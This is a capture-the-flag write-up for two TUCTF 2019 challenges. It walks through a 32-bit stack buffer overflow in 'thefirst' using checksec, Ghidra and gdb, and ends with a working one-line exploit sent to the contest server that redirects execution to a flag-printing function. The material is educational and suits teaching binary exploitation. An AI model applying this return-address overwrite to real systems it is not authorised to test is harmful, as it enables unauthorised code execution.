# Tuctf 2019 pwn / re

This writeup contains two seperate writeups for `runme`, and `thefirst`. If you want to learn more about binary exploitation / reverse engineering, checkout `https://github.com/guyinatuxedo/nightmare`.

## runme

We just have to run this one:

```
$	./runme 
Enter 'flag'
> flag
TUCTF{7h4nk5_f0r_c0mp371n6._H4v3_fun,_4nd_600d_luck}
```

## thefirst

This is a pretty simple buffer overflow challenge. Checkout `https://github.com/guyinatuxedo/nightmare/tree/master/modules/05-bof_callfunction` for more details than what's below.

Start off, this is the binary:

```
$	pwn checksec thefirst 
[*] '/home/guyinatuxedo/Desktop/restuctf/thefirst'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$	file thefirst 
thefirst: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d5cdb22c21ed1fe37f1d5d30ba2ddb7c03e34e9a, for GNU/Linux 3.2.0, not stripped
$	./thefirst 
Let's see what you can do
> 0000000000000000000000000000000000000000000000000000000
Segmentation fault (core dumped)
```

Looks like it has a buffer overflow. Checking the main function in ghidra confirms it uses `gets`:

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  char vulnBuf [16];
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  setvbuf(stdin,(char *)0x0,2,0x14);
  printf("Let\'s see what you can do\n> ");
  gets(vulnBuf);
  return 0;
}
```

Take a quick look in gdb to see what the offset is from the start of our input to the return address:

```
gef➤  b *0x804927b
Breakpoint 1 at 0x804927b
gef➤  r
Starting program: /home/guyinatuxedo/Desktop/restuctf/thefirst 
Let's see what you can do
> 15935728

Breakpoint 1, 0x0804927b in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd004  →  "15935728"
$ebx   : 0x0804c000  →  0x0804bf0c  →  0x00000001
$ecx   : 0xf7fb05c0  →  0xfbad208b
$edx   : 0xf7fb201c  →  0x00000000
$esp   : 0xffffd000  →  0xffffd004  →  "15935728"
$ebp   : 0xffffd018  →  0x00000000
$esi   : 0xf7fb0000  →  0x001dbd6c
$edi   : 0xf7fb0000  →  0x001dbd6c
$eip   : 0x0804927b  →  <main+92> add esp, 0x4
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd000│+0x0000: 0xffffd004  →  "15935728"	 ← $esp
0xffffd004│+0x0004: "15935728"
0xffffd008│+0x0008: "5728"
0xffffd00c│+0x000c: 0x00000000
0xffffd010│+0x0010: 0xf7fb0000  →  0x001dbd6c
0xffffd014│+0x0014: 0x00000000
0xffffd018│+0x0018: 0x00000000	 ← $ebp
0xffffd01c│+0x001c: 0xf7df2751  →  <__libc_start_main+241> add esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049272 <main+83>        lea    eax, [ebp-0x14]
    0x8049275 <main+86>        push   eax
    0x8049276 <main+87>        call   0x80490a0 <gets@plt>
 →  0x804927b <main+92>        add    esp, 0x4
    0x804927e <main+95>        mov    eax, 0x0
    0x8049283 <main+100>       mov    ebx, DWORD PTR [ebp-0x4]
    0x8049286 <main+103>       leave  
    0x8049287 <main+104>       ret    
    0x8049288 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "thefirst", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804927b → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffd004 - 0xffffd00c  →   "15935728" 
gef➤  i f
Stack level 0, frame at 0xffffd020:
 eip = 0x804927b in main; saved eip = 0xf7df2751
 Arglist at 0xffffcffc, args: 
 Locals at 0xffffcffc, Previous frame's sp is 0xffffd020
 Saved registers:
  ebx at 0xffffd014, ebp at 0xffffd018, eip at 0xffffd01c
gef➤  q
```

So we can see that the offset is `0xffffd01c - 0xffffd004 = 0x18`. We also see that there is a `printFlag` function at `0x080491f6`:

```
void printFlag(void)

{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  system((char *)(iVar1 + 0xe05));
  return;
}
```

That gives us everything we need to solve this challenge:

```
$	python -c 'print "0"*0x18 + "\xf6\x91\x04\x08"'| nc chal.tuctf.com 30508
Let's see what you can do
> TUCTF{0n3_d0wn..._50_m4ny_70_60}
```